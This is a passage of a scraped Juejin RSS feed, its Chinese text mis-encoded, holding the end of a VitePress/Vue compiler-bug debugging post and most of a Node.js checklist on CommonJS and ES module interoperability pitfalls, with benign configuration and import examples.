<li>å•ä¸ª"é—®é¢˜"å¯èƒ½ä¸ä¼šè§¦å‘ Bug</li>
<li>å¤šä¸ªè¾¹ç•Œæƒ…å†µç»„åˆå¯èƒ½å¯¼è‡´ç¼–è¯‘å™¨å´©æºƒ</li>
</ul>
</li>
<li>
<p><strong>è°ƒè¯•éœ€è¦è€å¿ƒ</strong></p>
<ul>
<li>æœ‰æ—¶é—®é¢˜ä¸åœ¨é”™è¯¯æç¤ºçš„é‚£ä¸€è¡Œ</li>
<li>éœ€è¦ç³»ç»Ÿæ€§åœ°åˆ†æå’Œæµ‹è¯•</li>
</ul>
</li>
<li>
<p><strong>é¢„é˜²èƒœäºæ²»ç–—</strong></p>
<ul>
<li>æ·»åŠ è‡ªåŠ¨åŒ–æ£€æŸ¥è„šæœ¬</li>
<li>å»ºç«‹æ ¼å¼è§„èŒƒå¹¶ä¸¥æ ¼éµå®ˆ</li>
<li>å®šæœŸå®¡æŸ¥å¤§æ–‡ä»¶ï¼ŒåŠæ—¶æ‹†åˆ†</li>
</ul>
</li>
</ol>
<h4 data-id="heading-24">å†™åœ¨æœ€å</h4>
<p>è¿™ä¸ª Bug çš„å‘ç°å’Œè§£å†³å†ç»äº† <strong>200+ æ¬¡çš„è°ƒè¯•å’Œæµ‹è¯•</strong>ï¼Œå……åˆ†ä½“ç°äº†å¤§å‹é¡¹ç›®ä¸­å·¥å…·é“¾çš„å¤æ‚æ€§ã€‚è™½ç„¶æœ€ç»ˆçš„ä¿®å¤å¾ˆç®€å•ï¼ˆå‡ ä¸ªç©ºæ ¼å’Œæ ‡ç­¾è°ƒæ•´ï¼‰ï¼Œä½†é—®é¢˜çš„è¯Šæ–­è¿‡ç¨‹å´éœ€è¦å¯¹ç¼–è¯‘åŸç†ã€Markdown è§£æã€Vue æ¨¡æ¿ç¼–è¯‘ç­‰å¤šæ–¹é¢çš„ç†è§£ã€‚</p>
<p>æ›´é‡è¦çš„æ˜¯ï¼Œè¿™æ¬¡ç»å†è®©æˆ‘æ„è¯†åˆ°ï¼š</p>
<ul>
<li><strong>ä¸è¦ç›²ç›®ç›¸ä¿¡å·¥å…·</strong>ï¼šå³ä½¿æ˜¯æˆç†Ÿçš„å·¥å…·é“¾ä¹Ÿå¯èƒ½æœ‰ Bug</li>
<li><strong>ä¿æŒä»£ç æ•´æ´</strong>ï¼šè‰¯å¥½çš„æ ¼å¼è§„èŒƒä¸ä»…æé«˜å¯è¯»æ€§ï¼Œè¿˜èƒ½é¿å…è§¦å‘å·¥å…·çš„è¾¹ç•Œæƒ…å†µ</li>
<li><strong>å»ºç«‹åé¦ˆæœºåˆ¶</strong>ï¼šé‡åˆ°é—®é¢˜è¦åŠæ—¶è®°å½•å’Œåˆ†äº«ï¼Œå¸®åŠ©ç¤¾åŒºæ”¹è¿›</li>
</ul>
<p>å¦‚æœä½ ä¹Ÿé‡åˆ°äº†ç±»ä¼¼çš„é—®é¢˜ï¼Œå¸Œæœ›è¿™ç¯‡æ–‡ç« èƒ½å¸®ä½ å¿«é€Ÿå®šä½å’Œè§£å†³ã€‚å¦‚æœä½ æœ‰æ›´å¥½çš„è§£å†³æ–¹æ¡ˆæˆ–è§è§£ï¼Œæ¬¢è¿è®¨è®ºäº¤æµï¼</p>
<hr/>
<p><strong>ä½œè€…</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fjiangxu.net" target="_blank" title="https://jiangxu.net" ref="nofollow noopener noreferrer">jiangxu.net</a><br/>
<strong>æ—¥æœŸ</strong>ï¼š2026-01-08<br/>
<strong>æ ‡ç­¾</strong>ï¼š<code>VitePress</code> <code>Vue</code> <code>Markdown</code> <code>ç¼–è¯‘å™¨Bug</code> <code>è°ƒè¯•ç»éªŒ</code></p>
<blockquote>
<p>å†™ä½œä¸æ˜“ï¼Œå¦‚æœè¿™ç¯‡æ–‡ç« å¯¹ä½ æœ‰å¸®åŠ©ï¼Œæ¬¢è¿åˆ†äº«ç»™æ›´å¤šçš„äºº â­</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js æ¨¡å—åŠ è½½ - 4 - CJS å’Œ ESM äº’æ“ä½œé¿å‘æ¸…å•]]></title>    <link>https://juejin.cn/post/7592615536384999458</link>    <guid>https://juejin.cn/post/7592615536384999458</guid>    <pubDate>2026-01-08T09:47:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7592615536384999458" data-draft-id="7592637149697097763" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js æ¨¡å—åŠ è½½ - 4 - CJS å’Œ ESM äº’æ“ä½œé¿å‘æ¸…å•"/> <meta itemprop="keywords" content="å‰ç«¯,Node.js"/> <meta itemprop="datePublished" content="2026-01-08T09:47:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¹‹æ’å›"/> <meta itemprop="url" content="https://juejin.cn/user/2261046026312318"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js æ¨¡å—åŠ è½½ - 4 - CJS å’Œ ESM äº’æ“ä½œé¿å‘æ¸…å•
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2261046026312318/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¹‹æ’å›
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-08T09:47:35.000Z" title="Thu Jan 08 2026 09:47:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:14px;overflow-x:hidden;color:var(--cyanosis-base-color);transition:color .35s;--cyanosis-base-color:#353535;--cyanosis-title-color:#005bb7;--cyanosis-strong-color:#2196f3;--cyanosis-em-color:#4fc3f7;--cyanosis-del-color:#ccc;--cyanosis-link-color:#3da8f5;--cyanosis-linkh-color:#007fff;--cyanosis-border-color:#bedcff;--cyanosis-border-color-2:#ececec;--cyanosis-bg-color:#fff;--cyanosis-blockquote-color:#8c8c8c;--cyanosis-blockquote-bg-color:#f0fdff;--cyanosis-code-color:#c2185b;--cyanosis-code-bg-color:#fff4f4;--cyanosis-code-pre-color:#f8f8f8;--cyanosis-table-border-color:#c3e0fd;--cyanosis-table-th-color:#dff0ff;--cyanosis-table-tht-color:#005bb7;--cyanosis-table-tr-nc-color:#f7fbff;--cyanosis-table-trh-color:#e0edf7;--cyanosis-slct-title-color:#005bb7;--cyanosis-slct-titlebg-color:rgba(175,207,247,0.25);--cyanosis-slct-text-color:#c80000;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#e8ebec;--cyanosis-slct-codebg-color:#ffeaeb;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body.__dark{--cyanosis-base-color:#cacaca;--cyanosis-title-color:#ddd;--cyanosis-strong-color:#fe9900;--cyanosis-em-color:#ffd28e;--cyanosis-del-color:#ccc;--cyanosis-link-color:#ffb648;--cyanosis-linkh-color:#fe9900;--cyanosis-border-color:#ffe3ba;--cyanosis-border-color-2:#ffcb7b;--cyanosis-bg-color:#2f2f2f;--cyanosis-blockquote-color:#c7c7c7;--cyanosis-blockquote-bg-color:rgba(255,199,116,0.1);--cyanosis-code-color:#000;--cyanosis-code-bg-color:#ffcb7b;--cyanosis-code-pre-color:rgba(255,227,185,0.5);--cyanosis-table-border-color:#fe9900;--cyanosis-table-th-color:#ffb648;--cyanosis-table-tht-color:#000;--cyanosis-table-tr-nc-color:#6d5736;--cyanosis-table-trh-color:#947443;--cyanosis-slct-title-color:#000;--cyanosis-slct-titlebg-color:#fe9900;--cyanosis-slct-text-color:#00c888;--cyanosis-slct-bg-color:rgba(175,207,247,0.25);--cyanosis-slct-del-color:#999;--cyanosis-slct-elbg-color:#000;--cyanosis-slct-codebg-color:#ffcb7b;--cyanosis-slct-prebg-color:rgba(160,200,255,0.25)}.markdown-body h1{padding-bottom:4px;font-size:30px}.markdown-body h1,.markdown-body h2{margin-top:36px;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);transition:color .35s}.markdown-body h2{position:relative;padding-left:10px;padding-right:10px;padding-bottom:10px;font-size:24px;border-bottom:1px solid var(--cyanosis-border-color-2)}.markdown-body h2:before{content:"ã€Œ";position:absolute;top:-6px;left:-14px}.markdown-body h2:after{content:"ã€";position:relative;top:6px;right:auto}.markdown-body h3{position:relative;padding-bottom:0;margin-top:30px;margin-bottom:10px;font-size:20px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h3:before{content:"Â»";padding-right:6px;color:var(--cyanosis-strong-color)}.markdown-body h4{margin-top:24px;font-size:16px}.markdown-body h4,.markdown-body h5{padding-bottom:0;margin-bottom:10px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body h5{margin-top:18px;font-size:14px}.markdown-body h6{padding-bottom:0;margin-top:12px;margin-bottom:10px;font-size:12px;line-height:1.5;color:var(--cyanosis-title-color);padding-left:6px;transition:color .35s}.markdown-body p{line-height:inherit;margin-top:16px;margin-bottom:16px}.markdown-body img{max-width:100%}.markdown-body hr{position:relative;width:98%;height:1px;margin-top:32px;margin-bottom:32px;background-image:linear-gradient(90deg,var(--cyanosis-link-color),rgba(255,0,0,.3),hsla(0,0%,100%,.1),rgba(255,0,0,.3),var(--cyanosis-link-color));border-width:0;overflow:visible}.markdown-body hr:after{content:"";position:absolute;margin:auto;left:0;right:0;bottom:0;top:0;display:inline-block;width:60px;height:20px;background-color:var(--cyanosis-bg-color);background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACgAAAAgCAYAAABgrToAAAADoklEQVRYR82XTYgcRRTHf2933Q1RjAa9eFO8JHoJ8RQVBQ2iBwXBET0YEUTXNVmNQtTpmeqaWV0XNRq/o4KoECSCEPSg4CF+BYUkIIiCoCJCPIhC/Ihh2Z0nVV27VnZnenumW9i6ddV7//frV69fVQurfMgq56NawFTPAU6QyomqXrw6wIZeyhCPebA5buNR+akKyGoAjd6BshthnYdSjqNcRVuOlIUsD2j0SuA94IwuMHdh5ZUykOUBXfSGbmKI54EtAeYIHSZoy5dl4JxvNYBOKdW1KE8BQ8AkVk6WhasWsAiN0TX9gveXQaPP+Aytpc4u+bMI06JNohsYYYYOR2lJWtS3OKDRfcAtQfgDoI6Vo4UCGb0OmAEuDvZvYmVbEd/igC3dzDz7gQu8sPA9kJDK27mBmjqBeLjTg90PDFOjWawFFQd06kZHEfaj3LAIpTRpSXsZ5E06zEYP9sDimnAApYaV2SLZG/wjMeqAkijwW4xQJ5Gf/ZzRC8OW3hiBTGGlURRswW55Bh/Ssxljrwew8l1PQaM14GngvGDzBUKdDsMeTtgU5o8B92PFlUf3YXUrHa7Fys6lBqcCGnX15YQ2A18FyPd7Crd1A3M8C1wdbH4DD3hWeP6IEXbQkG97ajR1HPFnuPP5jFFq1OWX7hl8WM9l1AO648uNfwLk7tytMeogty+xeQ4rO3r6bdcx1nuwOGsHmaXGtPzae4uzGnLH1kQkvpdZGrHjssBZJrL+pqS05KWc8tgITAPXRzYvYOXe/C2OV43eDcRBDtIhoS2f9wzc0Cv8Wls+zoFzUC5zF0U241h5uZtPfptp6OUM8wbK+cH5GEpCS17P3fJei0Z3+npTxryJ8CPzbKMtn/ZyWbkPGl0PuFPkmkjkcb4h4R2ZLwRq1H0ALmvjkf2HwK1Y+T1PY2XABe/sHJ6MxN5lnoSpnC/UGbsTaI5phK2R7x6s3Ffk5YoDOrWm3onwJHBmEP86bPmBrsGaenNoIdnxCH+gPEhLXi0Cl1VBvyPVLSh7gEuC62yAfOIUqabWEaaiucMIk6RyqJ+Q/QM69V26jjW86Gvov/EaoyT8zRCn+Xq7PVrbx0nuYUaO9wM3WAbjCE1NEUw09Um4UV+2OKfYfu5/S19gsAzGKqm6LE5FrShbdS0ku465DjDwKA/oQht19ejqbaEVuRbiLhuHByYLjtUAZpDutzP7cYdHsPJXWbjyNVgFwQoa1WXwf4Jd9YD/Ap80+yE7+u9aAAAAAElFTkSuQmCC);background-repeat:no-repeat;background-size:auto 100%;background-position-x:center;transition:background-color .5s}.markdown-body code{padding:.065em .4em;font-size:.87em;color:var(--cyanosis-code-color);word-break:break-word;overflow-x:auto;background-color:var(--cyanosis-code-bg-color);border-radius:2px}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;padding:16px 12px;margin:0;font-size:12px;color:#333;word-break:normal;overflow-x:auto;background:var(--cyanosis-code-pre-color)}.markdown-body pre&gt;code::-webkit-scrollbar{width:4px;height:4px}.markdown-body pre&gt;code::-webkit-scrollbar-track{background-color:var(--cyanosis-border-color)}.markdown-body pre&gt;code::-webkit-scrollbar-thumb{background-color:var(--cyanosis-strong-color);border-radius:10px}.markdown-body a{position:relative;text-decoration:none;color:var(--cyanosis-link-color);border-bottom:1px solid var(--cyanosis-border-color)}.markdown-body a:hover{border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body a:active,.markdown-body a:hover{color:var(--cyanosis-linkh-color)}.markdown-body a:after{position:absolute;content:"";top:100%;left:0;width:100%;opacity:0;border-bottom:1px solid var(--cyanosis-border-color);transition:top .3s,opacity .3s;transform:translateZ(0)}.markdown-body a:hover:after{top:0;opacity:1;border-bottom-color:var(--cyanosis-linkh-color)}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid var(--cyanosis-table-border-color);border-spacing:0;border-collapse:collapse}.markdown-body table thead{color:#000;text-align:left;font-size:14px;background:#f6f6f6}.markdown-body table tr:nth-child(2n){background-color:var(--cyanosis-table-tr-nc-color)}.markdown-body table tr:hover{background-color:var(--cyanosis-table-trh-color)}.markdown-body table td,.markdown-body table th{padding:12px 8px;line-height:24px;border:1px solid var(--cyanosis-table-border-color)}.markdown-body table th{color:var(--cyanosis-table-tht-color);background-color:var(--cyanosis-table-th-color)}.markdown-body table td{min-width:120px}.markdown-body blockquote{color:var(--cyanosis-blockquote-color);border-left:4px solid var(--cyanosis-strong-color);background-color:var(--cyanosis-blockquote-bg-color);padding:1px 20px;margin:22px 0;transition:color .35s}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body b,.markdown-body blockquote&gt;b,.markdown-body blockquote&gt;strong,.markdown-body strong{color:var(--cyanosis-strong-color)}.markdown-body em,.markdown-body i{color:var(--cyanosis-em-color)}.markdown-body del{color:var(--cyanosis-del-color)}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:4px}.markdown-body ol li{padding-left:6px}.markdown-body details&gt;summary{outline:none;color:var(--cyanosis-title-color);font-size:20px;font-weight:bolder;border-bottom:1px solid var(--cyanosis-border-color);cursor:pointer}.markdown-body details&gt;p{padding:10px 20px;margin:10px 0 0;color:#666;background-color:var(--cyanosis-blockquote-bg-color);border:2px dashed var(--cyanosis-strong-color)}.markdown-body h1::selection,.markdown-body h2::selection,.markdown-body h3::selection,.markdown-body h4::selection,.markdown-body h5::selection,.markdown-body h6::selection{color:var(--cyanosis-slct-title-color);background-color:var(--cyanosis-slct-titlebg-color)}.markdown-body ol li::selection,.markdown-body p::selection,.markdown-body ul li::selection{color:var(--cyanosis-slct-text-color);background-color:var(--cyanosis-slct-bg-color)}.markdown-body a::selection,.markdown-body b::selection,.markdown-body em::selection,.markdown-body i::selection,.markdown-body strong::selection{background-color:var(--cyanosis-slct-elbg-color)}.markdown-body del::selection{color:var(--cyanosis-slct-del-color);background-color:var(--cyanosis-slct-elbg-color)}.markdown-body table thead th::selection{background-color:transparent}.markdown-body table tbody td::selection{background-color:var(--cyanosis-slct-bg-color)}.markdown-body code::selection{background-color:var(--cyanosis-slct-codebg-color)}.markdown-body pre&gt;code::selection{background-color:var(--cyanosis-slct-prebg-color)}.markdown-body .contains-task-list{padding-left:14px;list-style:none}.markdown-body .contains-task-list input[type=checkbox]{position:relative}.markdown-body .contains-task-list input[type=checkbox]:before{content:"";position:absolute;top:0;left:0;right:0;bottom:0;width:inherit;height:inherit;background:#f0f8ff;border:1px solid #add6ff;border-radius:2px;box-sizing:border-box;z-index:1}.markdown-body .contains-task-list input[type=checkbox]:checked:after{content:"âœ“";position:absolute;top:-12px;left:0;right:0;bottom:0;width:0;height:0;color:#f55;font-size:20px;font-weight:700;z-index:2}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="atelier-estuary-light">.hljs-comment,.hljs-quote{color:#6c6b5a}.hljs-attribute,.hljs-link,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ba6236}.hljs-built_in,.hljs-builtin-name,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#ae7313}.hljs-bullet,.hljs-string,.hljs-symbol{color:#7d9726}.hljs-section,.hljs-title{color:#36a166}.hljs-keyword,.hljs-selector-tag{color:#5f9182}.hljs-addition,.hljs-deletion{color:#22221b;display:inline-block;width:100%}.hljs-deletion{background-color:#ba6236}.hljs-addition{background-color:#7d9726}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#f4f3ec;color:#5f5e4e}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>è¿™ä»½æ¸…å•è¦†ç›–<strong>é¡¹ç›®é…ç½®ã€æ¨¡å—å¯¼å…¥å¯¼å‡ºã€è·¯å¾„è§£æã€ç¬¬ä¸‰æ–¹åŒ…å…¼å®¹</strong>å››å¤§æ ¸å¿ƒåœºæ™¯ï¼Œä¸ºé¿å¼€è·¨æ¨¡å—è§„èŒƒçš„å¸¸è§é—®é¢˜ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€ é¡¹ç›®åŸºç¡€é…ç½®é¿å‘</h2>
<ol>
<li><strong>æ˜ç¡®æ¨¡å—ç±»å‹ï¼Œé¿å…è‡ªåŠ¨åˆ‡æ¢æ··ä¹±</strong></li>
</ol>
<ul>
<li>
<ul>
<li>Node.js é»˜è®¤ <code>.js</code> æ–‡ä»¶ä¸º CJSï¼Œè‹¥è¦å…¨å±€å¯ç”¨ ESMï¼Œå¿…é¡»åœ¨é¡¹ç›®æ ¹ç›®å½• <code>package.json</code> ä¸­é…ç½® <code>"type": "module"</code>ã€‚</li>
<li>è‹¥åªæƒ³å•ä¸ªæ–‡ä»¶ç”¨ ESMï¼Œå¯å°†åç¼€æ”¹ä¸º <code>.mjs</code>ï¼›å•ä¸ªæ–‡ä»¶ç”¨ CJSï¼Œåç¼€æ”¹ä¸º <code>.cjs</code>ï¼ˆä¸å— <code>package.json</code> çš„ <code>type</code> å½±å“ï¼‰ã€‚</li>
<li>âŒ é”™è¯¯ï¼šé¡¹ç›®æ ¹ç›®å½•æ²¡é… <code>"type": "module"</code>ï¼Œå´åœ¨ <code>.js</code> æ–‡ä»¶é‡Œå†™ <code>import/export</code> â†’ ç›´æ¥æŠ¥é”™ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li><code>package.json</code> <strong>å­—æ®µä¼˜å…ˆçº§è¦åˆ†æ¸…</strong></li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"main"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist/index.cjs"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"exports"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
    <span class="hljs-attr">"."</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span>
      <span class="hljs-attr">"require"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist/index.cjs"</span><span class="hljs-punctuation">,</span>
      <span class="hljs-attr">"import"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./dist/index.mjs"</span>
    <span class="hljs-punctuation">}</span>
  <span class="hljs-punctuation">}</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>
<ul>
<li>ESM ä¼˜å…ˆè¯»å– <code>exports</code> å­—æ®µï¼ŒCJS ä¼˜å…ˆè¯»å– <code>main</code> å­—æ®µã€‚</li>
<li>è‹¥è¦åŒæ—¶å…¼å®¹ CJS å’Œ ESMï¼Œéœ€åœ¨ <code>exports</code> ä¸­åˆ†åˆ«å£°æ˜ï¼š</li>
</ul>
</li>
</ul>
<h2 data-id="heading-1">äºŒã€ æ¨¡å—å¯¼å…¥å¯¼å‡ºé¿å‘</h2>
<ol>
<li><strong>CJS ä¸èƒ½ç›´æ¥</strong> <code>require()</code> <strong>ESM æ¨¡å—</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// CJS æ–‡ä»¶ä¸­åŠ è½½ ESM æ¨¡å—</span>
<span class="hljs-keyword">import</span>(<span class="hljs-string">'./esm-file.js'</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function">(<span class="hljs-params"><span class="hljs-variable language_">module</span></span>) =&gt;</span> {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-variable language_">module</span>.<span class="hljs-property">default</span>); <span class="hljs-comment">// æ‹¿åˆ° ESM çš„é»˜è®¤å¯¼å‡º</span>
});
</code></pre>
<ul>
<li>
<ul>
<li>âŒ é”™è¯¯ï¼š<code>const esmModule = require('./esm-file.js')</code>ï¼ˆè¯¥æ–‡ä»¶æ˜¯ ESM æ ¼å¼ï¼‰â†’ æŠ¥ <code>ERR_REQUIRE_ESM</code>ã€‚</li>
<li>âœ… è§£å†³ï¼šç”¨ <code>import()</code> åŠ¨æ€å¯¼å…¥ï¼ˆè¿”å› Promiseï¼‰ï¼š</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>ESM åŠ è½½ CJS æ¨¡å—çš„æ³¨æ„äº‹é¡¹</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ESM æ–‡ä»¶ä¸­åŠ è½½ CJS æ¨¡å—</span>
<span class="hljs-keyword">import</span> cjsModule <span class="hljs-keyword">from</span> <span class="hljs-string">'./cjs-file.js'</span>;
<span class="hljs-comment">// ç­‰ä»·äº CJS çš„ const cjsModule = require('./cjs-file.js')</span>
</code></pre>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// æ–¹æ¡ˆ1ï¼šè§£æ„é»˜è®¤å¯¼å‡º</span>
<span class="hljs-keyword">import</span> cjsModule <span class="hljs-keyword">from</span> <span class="hljs-string">'./cjs-file.js'</span>;
<span class="hljs-keyword">const</span> { foo } = cjsModule;

<span class="hljs-comment">// æ–¹æ¡ˆ2ï¼šCJS æ¨¡å—å…¼å®¹å…·åå¯¼å‡ºå†™æ³•</span>
<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = { <span class="hljs-attr">foo</span>: <span class="hljs-string">'bar'</span> }; <span class="hljs-comment">// ESM å¯è§£æ„</span>
</code></pre>
<ul>
<li>
<ul>
<li>âœ… ESM å¯ä»¥ç›´æ¥ç”¨ <code>import</code> åŠ è½½ CJS æ¨¡å—ï¼ŒCJS çš„ <code>module.exports</code> ä¼šè¢«è§†ä¸º ESM çš„é»˜è®¤å¯¼å‡ºã€‚</li>
<li>âŒ å‘ï¼šCJS æ¨¡å—æ²¡æœ‰ ESM çš„å…·åå¯¼å‡ºï¼Œä¸èƒ½å†™ <code>import { foo } from './cjs-file.js'</code> â†’ å¯¼å…¥çš„ <code>foo</code> ä¸º <code>undefined</code>ã€‚</li>
<li>âœ… è§£å†³ï¼šè¦ä¹ˆè§£æ„é»˜è®¤å¯¼å‡ºï¼Œè¦ä¹ˆè®© CJS æ¨¡å—å…¼å®¹å¯¼å‡ºï¼š</li>
</ul>
</li>
</ul>
<ol start="3">
<li><code>__dirname</code> <strong>/</strong> <code>__filename</code> <strong>åœ¨ ESM ä¸­ä¸å¯ç”¨</strong></li>
</ol>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// ESM ä¸­æ›¿ä»£ __dirname/__filename</span>
<span class="hljs-keyword">import</span> { fileURLToPath } <span class="hljs-keyword">from</span> <span class="hljs-string">'url'</span>;
<span class="hljs-keyword">import</span> { dirname } <span class="hljs-keyword">from</span> <span class="hljs-string">'path'</span>;

<span class="hljs-keyword">const</span> __filename = <span class="hljs-title function_">fileURLToPath</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">url</span>);
<span class="hljs-keyword">const</span> __dirname = <span class="hljs-title function_">dirname</span>(__filename);
</code></pre>
<ul>
<li>
<ul>
<li>CJS ä¸­çš„ <code>__dirname</code>ï¼ˆå½“å‰æ–‡ä»¶ç›®å½•è·¯å¾„ï¼‰ã€<code>__filename</code>ï¼ˆå½“å‰æ–‡ä»¶è·¯å¾„ï¼‰åœ¨ ESM ä¸­è¢«ç§»é™¤ã€‚</li>
<li>âŒ é”™è¯¯ï¼šåœ¨ ESM æ–‡ä»¶ä¸­ç›´æ¥ç”¨ <code>__dirname</code> â†’ æŠ¥ <code>ReferenceError</code>ã€‚</li>
<li>âœ… è§£å†³ï¼šç”¨ <code>import.meta.url</code> æ‰‹åŠ¨å®ç°ï¼š</li>
</ul>
</li>
</ul>
<h2 data-id="heading-2">ä¸‰ã€ è·¯å¾„è§£æé¿å‘</h2>
<ol>
<li><strong>ESM å¿…é¡»å†™å…¨æ–‡ä»¶æ‰©å±•å</strong></li>
</ol>
<ul>
<li>
<ul>
<li>è¿™æ˜¯æœ€å®¹æ˜“è¸©çš„å‘ï¼CJS æ”¯æŒçœç•¥ <code>.js</code>/<code>.json</code>ï¼ŒESM ä¸è¡Œã€‚</li>
<li>âŒ é”™è¯¯ï¼š<code>import helper from './utils/helper'</code> â†’ æŠ¥ <code>ERR_MODULE_NOT_FOUND</code>ã€‚</li>
<li>âœ… æ­£ç¡®ï¼š<code>import helper from './utils/helper.js'</code>ã€‚</li>
</ul>
</li>
</ul>
<ol start="2">
<li><strong>ESM åŠ è½½ç›®å½•å¿…é¡»é…ç½®</strong> <code>exports</code></li>
</ol>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"exports"</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">{</span> <span class="hljs-attr">"."</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"./index.js"</span> <span class="hljs-punctuation">}</span> <span class="hljs-comment">// æ˜ å°„ç›®å½•æ ¹åˆ° index.js</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<ul>
<li>
<ul>
